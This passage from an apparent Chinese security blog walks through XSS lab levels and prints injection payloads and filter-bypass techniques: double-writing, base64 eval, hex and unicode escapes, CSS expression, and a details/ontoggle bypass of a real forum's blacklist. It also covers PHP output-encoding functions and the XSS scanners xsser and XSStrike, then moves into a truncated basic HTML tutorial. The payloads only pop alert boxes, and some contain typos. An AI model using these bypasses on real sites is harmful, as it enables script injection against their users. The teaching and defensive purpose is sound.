页面成功被输出 点击确定，页面返回Congratulations!! 上面说的是svg但这里实验的是script，当然svg也可以只是没必要非要用svg 演示，进行抓包，将svg的Payload复制到p3的hackme后面 Forward放行，查看页面是否返回，同样可以 返回了Congratulations!! ，这样也行。 限制输入长度的XSS1、HTML表单文本框介绍HTML表单用于搜索不用类型的用户输入，表单元素指的是不同类型的input元素、复选框，单选按钮，提交按钮等，text定义常规文本输入 12345678属性介绍：value属性规定输入字段的初始值readonly属性规定输入字段为只读（不能修改）。disabled属性规定输入字段是禁用的，被禁用的元素是不可用的和不可点击的。被禁用的元素不会被提交size属性规定输入字段尺寸（以字符计）maxlength属性规定输入字段允许的最大长度如设置maxlength属性，则输入控件不会接受超过所允许数的字符该属性不会提供任何反馈，如果需要提醒用户，必须编写JavaScript代码 2、XSS Payload长度计算使用Python内置函数len(字符串)计算对应的字节数 3、浏览器审查工具修改源码当我们一直按住1的时候发现输入到15个长度就不能输入了，F12查看代码，发现maxlength限制了字符的长度是15。 我们可以进行更改，将15改为150，这样就可以输入更多的字符了，当然长度不能超过150 4、Payload触发XSS漏洞更改长度之后我们插入xss，闭合&lt;input&gt;，&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; 提交信息，页面弹出弹框，说明成功 点击确定返回Congratulations!! ，通关成功 HTML事件中的XSS1、HTML事件介绍在现代浏览器中都内置大量的事件处理器。这些处理器会监事特定的条件或用户行为，例如鼠标单击，或浏览器窗口中完成加载某个图案。用过是用JavaScript，可以将某些特定的事件处理器作为属性添加给特定的标签，并可以在事件发生时执行 2、XSS漏洞发现说白了是随便打，F12能找到就行 设置独一无二字符串提交，在响应中寻找 随便输入字符，F12使用左上角箭头选择输入框，找到你输入的内容 3、闭合思路分析我们可以发现，输入的XSS被当做字符串输出了，当做字符串输入就不会触发xss弹框 我们要通过HTML实践来触发XSS&quot;onmouseover=&quot;alert(document.domain) 提交，成功执行 4、Payload触发XSS漏洞当然不止onmouseover这一种事件，在本关开头图片上的事件可以每个都尝试一下，这里在使用一次onclick来进行XSS 进行提交 &quot;onclick=&quot;alert(document.domain); 提交之后单击输入框，就可以弹出XSS 空格分隔属性的XSS1、XSS探测空格分隔属性探测 构造第一无二的字符串，F12找到 当我们使用之前的方法闭合是没有用的，我们尝试一下使用空格分隔 当输入111 2222时，111在引号中，2222却在引号外出现，这样我们就可以直接使用XSS了 2、触发XSS这里不能使用script，尖括号被转义了，所以使用事件来进行XSS 使用onclick或者其他的都可以，这里使用的onclick，onmouseover也可以，其他事件可以挨个尝试 输入内容的时候，会自动在等于号后加双引号。 这里直接输入 111 onclick=clart(document.domain)， 这里直接输入 111 onclick=clart(document.domain)， javascript伪协议的XSS1、jacascript伪协议介绍将javascript代码添加到客户端的方法是把它放置在伪协议说明符javascript后的URL中。这个特殊的协议类型声明了URL的主体是任意的javascript代码，他由javascript的解析其运行，如果javascript：URL中javascript:var now = new Date();&quot;&lt;h1&gt;The time is:&lt;/h1&gt;&quot;+ now; javascript URL还可以含有只执行动作，但不返回值的javascript语句。 javascript:alert(&quot;hello word!&quot;) 2、XSS漏洞发现设置独一无二字符串提交，在响应中寻找。 这里输出了特殊字符串，说明可能存在XSS漏洞 3、a链接标签属性href介绍 &lt;a&gt;标签定义超链接。 &lt;a&gt;元素最用要的属性是href属性，它指定链接的目标。 4、Payload触发XSS漏洞Payload：javascript:alert(document.domain) 将Payload输入到输入框并提交 单击超链接，查看返回效果，成功弹出弹框，并返回了Congratulations!! 因为第九关是UTF-7的编码形式，现在基本上浏览器已经移除了UTF-7编码了，所以想到达第10关就要作弊一下F12使用箭头选择红框那里的提示框，在id=”hide”后面加入XSS代码，鼠标放上去时弹出XSS，这样就绕过了第九关 绕过过滤domain为空的XSS1、XSS漏洞发现构造特殊无害字符串，响应中寻找字符串 可以开到代码可以使用&quot;&gt;来闭合双引号和&lt;input&gt; 按照之前的办法使用&quot;&gt;&lt;script&gt;alert(document.domain);&lt;/script&gt; 查看返会结果，可以看到吧domain给替换成了空 2、绕过思考寻找过滤内容，这里过滤的就是domain 绕过策略 双写绕过 编码绕过 3、双写绕过Payload：&quot;&gt;&lt;script&gt;alert(document.dodomainmain)&lt;/script&gt; 复制Payload进行提交，页面成功弹窗。 返回了Congratulations!! 4、编码绕过eval函数是javascript当中经常用来执行字符串，这个字符串就会当做程序进行执行 atob函数是将加密的base64编码进行解码，转换成原来的字符 Payload：&quot;&gt;&lt;script&gt;eval(atob(&#39;YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ==&#39;));&lt;/script&gt; 这里进行加密的内容只有alert(document.domain) 进行提交 页面成功弹出弹框 查看页面返回信息 页面成功返回Congratulations!! 绕过替换scrip和on事件的XSS1、XSS漏洞发现构造特殊无害字符串，响应中寻找字符串，随便打 在响应中查找输入的内容，发现了输入的字符串，由此就可能有XSS漏洞，是否存在需要我们具体探测。 2、饶过思考1、寻找过滤内容 文本框输入的onclick已经被过滤了onxxx，所以没有触发xss漏洞 on事件被过滤后，我们尝试一下使用闭合inptu，使用script 可以看到script变成了xscript这样就导致页面无法弹出 3、伪协议绕过Payload：&quot;&gt;&lt;a href=&quot;javascript:alert(document.domain)&quot;&gt;xss&lt;/a&gt; 发现javascript中的script变成了xscript，这样也没有办法弹出 4、空格绕过Payload：&quot;&gt;&lt;a href=&quot;javascr ipt:alert(document.domain);&quot;&gt;xss&lt;/a&gt; 单击后面的xss超链接，成功返回 返回了Congratulations!!，成功通关 利用IE特性绕过XSS过滤1、XSS漏洞发现 2、基本XSS利用HTML事件触发XSS 发现onclick在双引号当中，需要进行闭合 发现输入的双引号并没有被闭合，而是双引号和去掉双引号后的空格被去掉了 测试之后使用script也被过滤了 3、IE特性IE中两个反引号``可以闭合一个左边双引号 4、Palyoad触发XSSPayload=``onclick=alert(document.domain) 编辑一个 发现使用``成功将双引号闭合，执行了onclick 点击输入框，弹出弹框说明成功 成功返回Congratulations!! 利用CSS特性触发XSS过滤CSS层叠样式表 1、XSS漏洞发现构造特殊无害字符串，在响应中查找 2、基本XSS利用因为是在属性中出现的字符串所以可以用事件触发XSS 利用HTML时间触发XSS 并没有当成Payload输出，而是当成字符串输出 使用script发现也是当做字符串输出，我们看一发现引号颜色不一样，这样可以确定被进行了转义 3、CSS特性讲解background是设置背景颜色 指定一个url表名要加载一张图片 在加载图路径当中输入javascript伪协议执行JS。目前只有IE浏览器支持，其他浏览器已经不支持了 1background.url(&quot;javascript:alert(document.domain);&quot;); 设置背景颜色 4、Payload触发XSS1background-color:#f00;background.url(&quot;javascript:alert(document.domain);&quot;); 设置背景颜色 IE11.0之后就不会执行该xss了 点击YES放行，成功弹出 IE中利用CSS触发XSS1、CSS介绍层叠样式表(英文全称：Cascading Style Sheets)是一种用来表现HTML（标准通用标记语言的一个应用）或XML（标准通用标记语言的一个子集）等文件样式的计算机语言。CSS不仅可以静态地修饰网页，还可以配合各种脚本语言动态地对网页各元素进行格式化。 2、CSS中执行JScss expression(css表达式)又称Dynamic properties(动态属性)是早期微软DHTML的产物，以其可以在Css中定义表达式(公式)来达到建立元素间属性之间的联系等作用，从IE5开始得到支持，后因标准、性能、安全性等问题，微软从IE8 beta2标准模式开始，取消对css expression的支持。 实际应用 早期很多开发人员利用css expression实现了许多效果，比如将元素相对鼠标指针进行定位，根据一个定时器来移动元素等等。当然这些效果能够使用js来实现。 虽然css表达式问题很多，但是我们依然能够在网上看到它们的影子，甚至在一些成熟的商业网站上。最常见的一个应用就是悬浮在页面上的某个模块(比如导航、返回顶部)。 3、注释绕过关键字过滤CSS中的注释符/**/ 绕过对关键字expression的过滤。ex/**/pression 4、触发XSSxss: 随便的属性爱设置啥设置啥 expres/**/sion 进行注释绕过 window.x window获取全局窗口，x是没有定义这个x变量，这样会报错执行alert代码 Payload：xss:expres/**/sion(if(!window.x){alert(document.domain);window.x=1}) 复制进行提交 返回弹框，点击确定，返回Congratulations！！ 16进制绕过过滤触发XSS1、16进制介绍十六进制转换有16进制每一位上可以是从小到大为：0-9、A-F。16个大小不同的数，即16进1，其中A-F（字母不区分大小写）这六个字母来分别表示10-15 使用python将字符串转换为16进制类型 \\\\x将它输出为JS可以识别的16进制的写法 print(&quot;\\\\x&quot;+binascii.b2a_hex(s) 2、XSS挖掘自己构造一个字符串 3、双斜杠+16进制绕过使用引号闭合等都不能将其闭合，还是当成字符串输出，可以看到，双引号颜色就不一样 将尖括号进行转义，输入，这里不能使用单斜杠也就是\\x3c会被转义，要是用双斜杠\\\\x3c这样才能正常输出 4、触发XSSPayload：\\\\x3cscript\\\\x3ealert(document.domain);\\\\x3c/script\\\\x3e 输入Payload，成功弹框 并且返回了Congratulations!! unicode绕过过滤触发XSS1、unicode介绍Unicode（统一码、万国码、单一码）是计算机科学领域里的一项业界标准，包括字符集、编码方案等。Unicode 是为了解决传统的字符编码方案的局限而产生的，它为每种语言中的每个字符设定了统一并且唯一的二进制编码，以满足跨语言、跨平台进行文本转换、处理的要求。 使用py将字符串转换为Unicode类型 加双斜杠，单斜杠会被转义\\u00就是JS能识别的Unicode编码 print &quot;\\\\u00&quot;+binascii.b2a_hex(&quot;&lt;&quot;) 2、XSS挖掘构造一个字符串 输入之后被没有将其转换为尖括号，这样就不能使用16进制绕过了 3、双斜杠+unicode绕过成功转换为了尖括号 4、触发XSSPayload：\\\\u003cscript\\\\u003ealert(document.domain);\\\\u003c/script\\\\u003e 复制Payload，输入提交成功弹框 浏览器同源策略介绍1、源的含义源指源头，信息来源的位置。在计算机中源在RFC6454文档中规定，源是由协议，主机名，端口名组成。 范例：协议://主机名:端口号/ 它们的协议不一样，所以不是同源 如：http://1.1.1.1:8080/ 和 https://1.1.1.1:8080/ 2、同源策略在计算机中，同源策略（Same origin policy，SOP）用于阻止一个非同源的页面恶意代码去访问另外一个非同源页面。 例如：源A–&gt;源B，如果两个的源不相同是不能进行直接通信的 只有两个页面属于同一个源才能互相访问。不同的源的客户端脚本在没有明确授权的情况下，不能读写对方资源。所以a.com下的JS脚本采用ajax读取b.com里面的文件数据是不会报错的 例如：源A页面访问源B页面认证cookie，如果不加阻止读取cookie，会造成cookie欺骗绕过登录验证。 注意：同源一定要是协议、主机名、端口号完全一致 3、IE源的特殊处理1、位于可信域（Trust Zones）的互信的域名间，不受同源策略限制 2、IE在判断同源时不考虑端口。 可是通过document.domain读取或修改源。但是有限制，修改之后的源不能通过其他脚本再次修改。 4、document.domaindomain 属性可以解决因同源安全策略带来的不同文档的属性共享问题。降域document.domain同源策略认为域和子域属于不同的域，如： child.a.com和a.com， child.a1.com和child2.a.com xxx.child1.a.com和child1.a.com 两两不同源，但可以通过设置document.domain=’a.com’，浏览器就会认为他们都是用一个源。想要实现以上任意两个页面之间的通信，两个页面必须都设置document.domain=’a.com’。 cookie的httponly设置1、cookie介绍指某些网站为了辨别用户身份，进行了session跟踪而存储在用户本地终端上的数据（通常经过加密）。 cookie是在HTTP协议下，服务器或脚本可以维护客户工作站上信息的一种方式。cookie是由web服务器保存在用户浏览器（客户端）上的小文本文件，他可以包含有关用户的信息。无论何时用户连接到服务器，web站点都可以访问cookie信息。 目前有些cookie是临时的，有些则是持续的。临时的cookie只在浏览器上保存一段规定的时间，一旦超过规定的时间，该cookie就会被系统清除。 2、cookie作用cookie是存储在客户端上的一段小数据，浏览器（及客户端）通过HTTP协议和服务器端进行cookie交互，通常用材存储一些不敏感信息。 有时候cookie用于身份认证，这时候cookie信息很敏感 演示dvwa，sql注入利用，sqlmap测试 直接测试的话会进行302跳转，这样就没办法获取 如果我们将登录后的cookie，加入的话，进行运行 成功返回数据库，这就是cookie身份验证时的作用 3、清除cookie 通过浏览器工具清除cookie，打开Internet选项 通过设置cookie的有效期来清除cookie；删除cookie可能会导致某些页面不能用。 可以通过一些就是360，电脑管家等杀毒软件清除cookie 4、cookie httponlysetcookie(“abc”,”test”,NULL,NULL,NULL,NULL,TRUE);设置secure参数为true之后，就不能使用js获取cookie 设置一个xss代码 设置为true不能返回cookie 设置为false， 发现弹出了内容 xss-filter过滤器介绍(防御)1、htmlspecialchars()函数htmlspecialchars()函数吧预定义的字符转换为HTML实体 预定义的字符是： &amp; (和号) 成为 &amp; &quot; (双引号) 成为 &quot; &#39; (单引号) 成为 &#39; &lt; (小于) 成为 &lt; &gt; (大于) 成为 1 htmlspecialchars(string,flags,character-set,double_encode) 参考链接：https://www.w3school.com.cn/php/func_string_htmlspecialchars.asp 编写一个简单的xss，使用htmlspecialchars()进行过滤 在地址栏输入id值，返回了 改进代码，将scrip代码当做字符串，也就是实体输出，不会当成代码输出 验证 2、htmlentities()函数这个函数对于过滤用户输入的数据非常有用，他会将一些特殊字符转换为HTML实体。例如，用户输入&lt;时就会被该函数转换为HTML实体&lt;(&amp;lt)，输入&gt;就会被转换为实体&amp;gt htmlentities(string,flags,character-set,double_encode) 参考链接：https://www.w3school.com.cn/php/func_string_htmlentities.asp 构造一个xss 在页面中输入，发现弹出了内容 进行过滤更改 在页面运行，返回了scipt的字符串，如果不加过滤就会弹出document.domain的内容 3、strip_tags()函数strip_tags()函数剥去字符串中的HTML、XML以及PHP的标签 注释：该函数始终会剥离HTML注释。这点无法通过allow参数改变 注释：该函数是二进制安全的 strip_tags(string,allow) 参考链接：https://www.w3school.com.cn/php/func_string_strip_tags.asp 更改代码 可以发现，他是直接删除了，JS的script标签，而不是进行了实体转换 4、自定义xss filter在网上有很多自定义的xss filter，进行自行下载 加入该函数 在页面中打开，去除了script标签 编码转义介绍1、URL编码 百分号编码：url编码包含一个百分号（%），后面跟着两个标识字符的ascii码的十六进制数，例如：空格转换为”%20”。 2、html编码 实体编码：一般以”&amp;”开头，” ; “结尾，可以不加” ; “。如：“&lt;”转为“&lt;” 进制编码：以“&amp;#”开头，加上字符的数值，以” ; “结尾，可以不加“;”。字符的数值可以是任意十进制的ascii码，或unicode字符编码。十六进制的数值需要在编码数字前加“x”。如：“&lt;”转换为十进制的“&lt;”或十六进制的”&lt;” 3、javascrip编码数字形式：\\u后面加4位16进制数字（或\\x后加2位16进制数字），按字符的uncode数据编码，不足位数以零填充，如：“&lt;”转为”\\u003c”或者”\\x3c”。其中”\\u”开头的unicode转义方式可以在字符串之外的位置，其他的不可以 jsfuck：http://www.jsfuck.com/ 4、编码含义 XSS过滤器绕过1、本地环境搭建在web程序中找到过滤的函数，然后拷贝到本地环境搭建完成 xss filter中的代码，加入了红框部分的内容 在页面查看发现成功将script标签删除掉了 2、xss payload测试kali linux下自带字典，在CTF比赛中经常使用 这里肯定使用的是XSS.txt。 3、自动化工具测试可以使用burpsuite进行自动化探测，将字典放进去让其自己执行筛选 4、关注最新HTML内容在进行XSS过程中一定要关注最新的HTML，尤其是新加入的标签，可能会被过滤导致XSS触发 例如HTML5中新标签 &lt;video src=1 onerror=alert(1)&gt; &lt;audio src=1 onerror=alert(1)&gt; 参考：https://owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet XSS发生的位置1、GET型URL中的XSS如果在URL中提交参数值，在页面中显示。很有可能存在XSS 这种就可以在输入框中直接输入xss代码 2、POST型表单中的XSS如果在表单中提交的参数值，在页面中显示。很有可能存在XSS 表单提交在页面显示结果，但在URL没有显示结果在响应中是Form Data表示表单数据，这时候他一定是一个POST提交参数 还是直接在输入框直接输入XSS 3、JSON中的XSSJSON(JavaScript Object Notation) 是一种轻量级的数据交换格式。易于人阅读和编写，同时也易于机器解析和生成，并有效地提升网络传输效率 JSON最常用的格式是对象的键值对。例如： {“firstName”:”Brett”,”lastName”:”McLaughlin”} 4、自定义HTTP头中的XSS如果在HTTP自定义头中提交的参数值，在页面中显示。很有可能就存在XSS 进行抓包，发送到repeater模块 在里面定义一个bwapp然后运行，页面返回信息 改为XSS内容，执行，在代码中复制连接在页面打开 页面成功弹出弹框 存储型XSS漏洞挖掘灰盒测试1、环境搭建使用phpStudy搭建 微社区程序-4-4—ROCBOSS 2、定向XSS挖掘XSS漏洞可以存在于个人资料处，文章发表处或者留言评论处等 3、黑名单审计私信位置没有被实体化，可以进行XSS，但是被黑名单过滤 查看过滤的名单，没有过滤details和ontaggle 4、绕过过滤，触发XSS已知过滤了javascript，构造了payload 因为javascript会被过滤掉，所以使用16进制进行绕过 打开details就会出发ontoggle事件 &quot;&gt;&lt;details open ontoggle=eval(&quot;\\x6a\\x61\\x76\\x61\\x76\\x61\\x73\\x63\\x72\\x69\\x70\\x74\\x76\\x3aalert(&#39;xss&#39;)&quot;)&gt;&lt;&quot; 进行私信发送 成功弹出XSS 自动化XSS挖掘工具—xsser1、xsser工具介绍xsser是一款针对web应用程序自动化挖掘、利用、报告xss漏洞的框架，kali下自带了xsser 2、xsser工具原理原理 3、xsser帮助信息xsser -h 注意：使用命令行工具时，不需要全部记忆参数，只需要熟练或用到时查找即可 4、xsser启动方式xsser启动方式可以分为命令行启动、图形化界面启动 在终端中以图形化界面启动输入 xsser --gtk XSS fuzzing工具1、XSStrike工具介绍XSStrike是一款检测Cross Site Scripting的高级检测工具。它集成了payload生成器、爬虫和模糊引擎功能。XSStrike不是像其他工具那样注入有效负载并检查其工作，而是通过多个解析器分析响应，然后通过与模糊引擎集成的上下文分析来保证有效负载。除此之外，XSStrike还具有爬行，模糊测试，参数发现，WAF检测功能。它还会扫描DOM XSS漏洞。 项目地址：https://github.com/s0md3v/XSStrike 2、XSStrike工具安装XSStrike只能运行在py3.6以上版本 3、XSStrike帮助信息xsstrike -h查看帮助信息 4、XSStrike实例演示python3 xsstrike.py -u “URL” 例如： ​ python3 xsstrike.py -u “http://192.168.1.102/xss-labs/level1.php?name=test&quot; 如果浏览器过滤的xss需要关闭xss筛选器 复制payload在浏览器的值后面输入","categories":[],"tags":[]},{"title":"Html","slug":"Html","date":"2020-04-12T11:28:01.132Z","updated":"2020-04-11T11:45:36.000Z","comments":true,"path":"2020/04/12/Html/","link":"","permalink":"https://zhanqiaozai.github.io/2020/04/12/Html/","excerpt":"","text":"HTML概述123456789101112131415161、系统结构： B&#x2F;S架构： Browser&#x2F;Servier （浏览器&#x2F;服务器的交互形式。） Browser支持的语言：HTML CSS JavaScript Servier端的语言有：C C++ Java Python等 B&#x2F;S架构的系统优缺点 优点：升级方便，只升级服务器端代码即可 缺点：速度慢，体验不好，界面不炫酷 企业内部都是用B&#x2F;S架构 C&#x2F;S架构： Client&#x2F;Server （客户端&#x2F;和服务器端的交互形式。） C&#x2F;S架构优缺点 优点：速度快，体验好，维护成本高。（娱乐型的系统多数是C&#x2F;S架构） 缺点：升级麻烦，维护成本较高 什么是HTML？怎么开发HTML？怎么运行HTML？ 12345678910111213141516171819202122HTML：Hypar Text Markup Language（超文本标记语言） 由大量的标签组成，每一个标签都有开始标签和结束标签。 标签中可能有字标签，字标签中有字标签 &lt;标签&gt; &lt;标签&gt; &lt;标签 属性名&#x3D;&quot;属性值&quot; 属性名&#x3D;&quot;属性值&quot;&gt; &lt;&#x2F;标签&gt; &lt;&#x2F;标签&gt; &lt;&#x2F;标签&gt; 超文本指：流媒体、图片、声音、视频... * HTML开发时候使用普通文本编辑器就可以，创建的文件扩展名是.html或者.htm HTML也有专业的开发工具。 例如： DreamWeaver、HBuilder...... * 直接采用浏览器打开HTML文件就是运行 HTML是W3C：世界万维网联盟W3C制定了HTML的规范，每个浏览器生产厂家都会遵守规范。HTML程序员也会按照这个规范写代码 * 比如图片都用&lt;img&gt;这个标记W3C制定了很多规范： HTML&#x2F;XML&#x2F;HTTP协议&#x2F;HTTPS协议....等等 第一个程序12345678910111213141516171819202122232425262728其中&lt;html&gt;是一个网页的开头和结尾而&lt;bead&gt;是网页的头，也是开始和结束,头部中有一个&lt;title&gt;标签也就是网页的标题有头有体，体就是身体，就是&lt;body&gt;&lt;&#x2F;body&gt;，而&lt;body&gt;这一块也就是网页的主题内容如果在html上面加上&lt;!doctype html&gt;这个表示当前html为5.0，如果不加就是4.0&lt;!--- 1、这是HTML的注释，可支持多行注释 2、加上&lt;!doctype html&gt;就是HTML5语法，去掉就是HTML4.0语法 3、HTML不区分大小写，语法松散不严格，最好还是按照规范结构写---&gt;&lt;!doctype html&gt;&lt;!---根---&gt;&lt;html&gt; &lt;!---头---&gt; &lt;bead&gt; &lt;!---网页标题，显示在网页左上角---&gt; &lt;title&gt;网页的标题&lt;&#x2F;title&gt; &lt;&#x2F;bead&gt; &lt;!---体---&gt; &lt;body&gt; 网页的主体内容 &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 要有缩进，我要是包着你，你就比我低一级，就得缩进一下1234567例如: &lt;html&gt; &lt;head&gt; &lt;img&gt; &lt;&#x2F;img&gt; &lt;&#x2F;head&gt; &lt;&#x2F;html&gt; 基本标签段落标记123段落标记是&lt;p&gt;&lt;&#x2F;p&gt;&lt;p&gt;&lt;&#x2F;p&gt;是在&lt;body&gt;中的如果不加&lt;p&gt;&lt;&#x2F;p&gt;查看页面效果 123456789101112131415如果加上段落标记&lt;p&gt;&lt;&#x2F;p&gt;在加入&lt;p&gt;&lt;&#x2F;p&gt;变成了一个段落&lt;!doctype html&gt;&lt;html&gt; &lt;herd&gt; &lt;title&gt;HTML的基本标签&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;!---段落标记---&gt; &lt;p&gt;Document，英语单词，名词、动词，作名词时译为“文件，公文；&lt;&#x2F;p&gt;&lt;p&gt;[计] 文档；证件”，作动词时译为“用文件证明”。&lt;&#x2F;p&gt; &lt;p&gt;Document，英语单词，名词、动词，作名词时译为“文件，公文；&lt;&#x2F;p&gt;&lt;p&gt;[计] 文档；证件”，作动词时译为“用文件证明”。&lt;&#x2F;p&gt; &lt;p&gt;Document，英语单词，名词、动词，作名词时译为“文件，公文；&lt;&#x2F;p&gt;&lt;p&gt;[计] 文档；证件”，作动词时译为“用文件证明”。&lt;&#x2F;p&gt; Document，英语单词，名词、动词，作名词时译为“文件，公文；[计] 文档；证件”，作动词时译为“用文件证明”。 &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 标题字1234标题字：是HTML预留的格式，和word的标题字相同标题字的标签是： &lt;h1&gt;&lt;&#x2F;h1&gt;到&lt;h6&gt;&lt;&#x2F;h6&gt; 依次字体越来越小，h1字体最大，h6字体最小 换行标签123如果只是回车来进行文字换行的话，是不会换行的，需要使用标签来进行换行HTML中的换行标签是&lt;br&gt;&lt;br&gt;标签是一个独目标签，没有&lt;&#x2F;br&gt;这种结束标签，也不能使用&lt;&#x2F;br&gt; 水平线标签12水平线标记和换行标记都是独目标记，都没有&lt;&#x2F;..&gt;来结束水平线的标签是&lt;hr&gt; 123在hr底下好可以加其他的东西，比如颜色，宽度&lt;hr color&#x3D;&quot;blue&quot; width&#x3D;&quot;50%&quot;&gt;这里选择了蓝色，宽度为50% 预留格式标签123预留格式标签就是在这个标签中，你输入的是什么格式就是什么格式，比如换行就不需要加&lt;br&gt;标签进行换行了。预留标签： &lt;pre&gt;内容&lt;&#x2F;pre&gt; 删除字，插入字，粗体字，斜体字1234&lt;del&gt;删除字&lt;&#x2F;del&gt;&lt;ins&gt;插入字&lt;&#x2F;ins&gt;&lt;b&gt;粗体字&lt;&#x2F;b&gt;&lt;i&gt;斜体字&lt;&#x2F;i&gt; 右上角和右下角加字1234510的平方，2出现在右上角10&lt;sup&gt;2&lt;&#x2F;sup&gt;出现在右下角10的m10&lt;sub&gt;m&lt;&#x2F;sub&gt; 字体标签12&lt;font&gt;字体标签&lt;&#x2F;font&gt;在这个标签中可以设置颜色，大小等等 实体符号空格，大于号，小于号123456789&amp;lt就是小于&amp;gt就是大于如果是b&lt;a&gt;c，如果这样输入的话，&lt;a&gt;是超链接标签，在执行时候会被当做标签隐藏，得到的结果就是bc实体符号特点是：以&amp;开始，以;结束。b&lt;a&gt;c空格&amp;nbsp。 如果要加空格直接使用键盘上的空格键是不行的，只能空一个格只有使用&amp;nbsp;才能加空格例如:12如果要用空格隔开要加几个空格就要加几个&amp;nbsp 1&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;2 表格1234这些标签并不是独目标签表格用标签&lt;table&gt;&lt;&#x2F;tbale&gt;表格中要有行标签是&lt;tr&gt;，一个tr就代表一行行中要有格，格用&lt;td&gt;表示 12345678910111213141516可以在&lt;table&gt;标签中添加border、width、heightborder&#x3D;&quot;1&quot; 设置表格的边框为1像素宽度width 宽度 后面单位可以使用%或者px,推荐使用%height 高度 后面单位可以使用%或者px,推荐使用%使用width设置边框的宽度为300像数，也可以使用%比如： &lt;table border&#x3D;&quot;1px&quot; width&#x3D;&quot;30%&quot; height&#x3D;&quot;20%&quot;&gt; 设置%百分比的好处就是，你的窗口变大他也跟着变大，窗口变小也跟着变小。 %百分比的意思就是，例如：50%就是占这个窗口的%50随着窗口的大小进行自我调节这个align属性可以加在&lt;tr&gt;中&lt;td&gt;中，这样将align的值设置为center这样就可以将内容居中相同left就是左对齐，right就是右对齐如果将align加在&lt;table&gt;标签中，可以使表格居中然是内容不居中(内容不居中的前提是没有在&lt;tr&gt;和&lt;td&gt;中加入align)align对齐方式&lt;tr align&#x3D;&quot;center&quot;&gt;&lt;td&gt;1&lt;&#x2F;td&gt; 12可以使用br进行换行，然后加入&lt;h2&gt;标题标签，然后再加入一个水平线标签加入align&#x3D;&quot;center&quot;来进行居中 1234也可以不用属性，直接使用center标签&lt;center&gt;&lt;&#x2F;center&gt;例如： &lt;center&gt;&lt;h2&gt;企业规划&lt;&#x2F;h2&gt;&lt;center&#x2F;&gt;效果都是一样的，自行选择 表-单元格合成12使用rowspan进行单元格合并例如：查看原始界面 123456789101112131415161718192021222324252627282930313233rowspan是行合并，如果要列合并的话是colspan使用rowspan属性进行合并，用6将9合并合并的时候必须将其中一个&lt;td&gt;标签删除注意：使用rowspan删除标签的时候只能删除下方的单元格 而colspan删除任何一个都行例如： &lt;html&gt; &lt;head&gt; &lt;title&gt;表格合并&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;table border&#x3D;&quot;1px&quot; width&#x3D;&quot;30%&quot; height&#x3D;&quot;20%&quot;&gt; &lt;tr&gt; &lt;td&gt;1&lt;&#x2F;td&gt; &lt;td&gt;2&lt;&#x2F;td&gt; &lt;td&gt;3&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td&gt;4&lt;&#x2F;td&gt; &lt;td&gt;5&lt;&#x2F;td&gt; &lt;!---在6的位置加上rowspan进行合并，删除或者注释掉9。---&gt; &lt;td rowspan&#x3D;&quot;2&quot;&gt;6&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;tr&gt; &lt;td&gt;7&lt;&#x2F;td&gt; &lt;td&gt;8&lt;&#x2F;td&gt; &lt;!---&lt;td&gt;9&lt;&#x2F;td&gt;---&gt; &lt;&#x2F;tr&gt; &lt;&#x2F;table&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 查看页面返回，6将9的单元格合并了 如果删除单元格而不加rowspan属性，页面返回，一个有问题的页面 12使用列合并属性colspan进行列合并使用方法和rowspan属性一样，删除一个值进行合并 th标签12th标签也是单元格标签，比td多的是加粗和居中首先查看td标签返回的结果 1在查看th标签返回的结果，自动加粗居中 表格thead tbody tfootthead tbody tfoot这三个其实就是讲代码table中的代码分组，为了后期操作简单，后期操作只需要一个组一个组得来进行修改。在没什么区别 注意：虽然没区别，但如果用了合并单元格的属性例如rowspan属性将两个地方使用这三个中其中一个进行分组分开了，就有可能出现问题 12345678910111213141516171819202122232425262728293031323334&lt;html&gt; &lt;head&gt; &lt;title&gt;thead tbody tfoot 在table中不是必须的，只是这样做便于后期JS代码编写&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;table border&#x3D;&quot;1px&quot; width&#x3D;&quot;50%&quot; height&#x3D;&quot;20%&quot;&gt; &lt;!---头---&gt; &lt;thead&gt; &lt;tr&gt; &lt;td&gt;员工部门&lt;&#x2F;td&gt; &lt;td&gt;员工编号&lt;&#x2F;td&gt; &lt;td&gt;员工工资&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;&#x2F;thead&gt; &lt;!---体---&gt; &lt;body&gt; &lt;tr&gt; &lt;td&gt;1&lt;&#x2F;td&gt; &lt;td&gt;2&lt;&#x2F;td&gt; &lt;td&gt;3&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;&#x2F;body&gt; &lt;!---脚---&gt; &lt;tfoot&gt; &lt;tr&gt; &lt;td&gt;4&lt;&#x2F;td&gt; &lt;td&gt;5&lt;&#x2F;td&gt; &lt;td&gt;6&lt;&#x2F;td&gt; &lt;&#x2F;tr&gt; &lt;&#x2F;tfoot&gt; &lt;&#x2F;table&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt; 设置背景颜色和图片设置背景颜色在body里面加入属性bgcolor=”颜色”来设置背景颜色 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;!---这行代码的作用是告诉浏览器采用哪一种字符集打开当前页面 注意：并不是设置当前页面的字符编码方式---&gt; &lt;meta charset&#x3D;&quot;utf-8&quot;&gt; &lt;title&gt;背景颜色和背景图片&lt;&#x2F;title&gt; &lt;&#x2F;head&gt; &lt;!---bgcolor用来设置背景颜色---&gt; &lt;body bgcolor&#x3D;&quot;aqua&quot;&gt; &lt;&#x2F;body&gt;&lt;&#x2F;html&gt;这里设置了背景颜色aqua查看页面 1234567891011121314151617设置图片背景图片使用属性background来设置网页的背景图片，如果图片不够大将重叠，将其铺满&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;!---这行代码的作用是告诉浏览器采用哪一种字符集打开当前页面 注意：并不是设置当前页面的字符编码方式---&gt; &lt;meta 